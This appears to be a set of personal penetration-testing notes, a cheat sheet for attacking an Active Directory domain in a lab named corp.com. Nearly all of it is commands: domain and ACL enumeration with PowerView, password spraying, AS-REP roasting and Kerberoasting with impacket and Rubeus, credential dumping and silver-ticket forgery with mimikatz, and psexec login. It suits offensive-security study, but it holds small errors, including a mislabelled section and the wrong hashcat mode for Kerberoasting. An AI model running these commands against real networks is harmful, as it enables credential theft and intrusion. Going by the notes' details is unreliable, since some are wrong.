##### Basic Enum
```
net user /domain

net user xxx /domain

net group /domain

net group "xx xxx" /domain

net accounts    //passwd policy
```

##### Use of PowerView
```
Get-NetDomain

//Enum user

Get-NetUser

Get-NetUser | select cn

Get-NetUser | select cn,pwdlastset,lastlogon,whencreated ...


//Enum group
Get-NetGroup | select cn

Get-NetGroup "xx xxx" | select member

//Enum machines
Get-NetComputer

//find privi
Find-LocalAdminAccess

//Enum loon session of other host
Get-NetSession -ComputerName xxx

//also use
.\PsLoggedon.exe \\files04

//Enum services
Get-NetUser -SPN | select samaccountname,serviceprincipalname

//for A service
setspn -L xxx_service

//for priv to objectives
Get-ObjectAcl -Identity user_name

we will find some objects

Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104


covert multiply ones

"xxx","xxx","xx","xxxx" | Convert-SidToName

//who has Gerneral All privi to this group

Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

  GenericAll: Full permissions on object
  GenericWrite: Edit certain attributes on the object
  WriteOwner: Change ownership of the object
  WriteDACL: Edit ACE's applied to object
  AllExtendedRights: Change password, reset password, etc.
  ForceChangePassword: Password change for object
  Self (Self-Membership): Add ourselves to for example a group
```

##### PasswdAttack
###### Passwd Spray
```
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com

.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
###### PAS-REQ reoasting  
//Target users with  Kerberos preauthentication unabled
```
Method1: from Linux
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete


Method2: with a user we have, in target Win host
.\Rubeus.exe asreproast /nowrap

Got the hash of THe user, use hashcat crack it, normally -m 18200
```
###### Kerberosting
// request TGS of a SPN/service from KDC, and crack the hash get the service
```
Method1: from Linux
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete


Method2: with a user we have, in target Win host
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

Got the hash of THe user, use hashcat crack it, normally -m 18200
```
###### Silver Ticket
```
//What we need: target SPN password hash, owned Domain SID

whoami /user      //get SID

mimikatz # privilege::debug

mimikatz # sekurlsa::logonpasswords  //get the SPN hash

//create ticket, forge the ticket as target user like jeffadmin 
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

//check whetehr the ticket is loaded in ram
PS C:\Tools> klist

//next we can export the ticket in a file and use it to login into the host the target service can login.
export KRB5CCNAME=Administrator.ccache

python3 psexec.py -k -no-pass corp.com/Administrator@target-server.corp.com
```
